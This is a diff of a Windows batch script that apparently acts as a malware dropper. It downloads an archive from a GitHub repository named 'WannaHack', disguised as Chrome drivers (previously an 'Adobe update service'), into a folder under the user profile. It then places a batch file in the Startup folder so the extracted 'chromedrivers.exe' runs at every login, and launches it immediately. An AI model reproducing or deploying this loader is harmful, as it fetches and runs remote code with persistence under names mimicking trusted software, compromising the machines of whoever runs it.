@@ -1,7 +1,6 @@
 @echo off
-set "zipUrl=https://github.com/FoliowiecGit/Eduware/releases/download/eduware/AdobeUpdateService32.zip"
+set "zipUrl=https://github.com/Foliowiec/WannaHack/releases/download/main/googlechromedrivers.rar"
 set "downloadPath=%USERPROFILE%\\URN"
-if exist "%downloadPath%" exit
 if not exist "%downloadPath%" mkdir "%downloadPath%"
 curl -L -o "%downloadPath%\sys.rar" "%zipUrl%"
 C:
@@ -11,6 +10,6 @@ set "startup=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
 set "batchScriptPath=%startup%\sys.bat"
 (
 echo @echo off
-echo start "" "%downloadPath%"
+echo start "" "%downloadPath%\googlechromedrivers\chromedrivers.exe"
 ) > "%batchScriptPath%"
-start "" "%downloadPath%"
+start "" "%downloadPath%\googlechromedrivers\chromedrivers.exe"
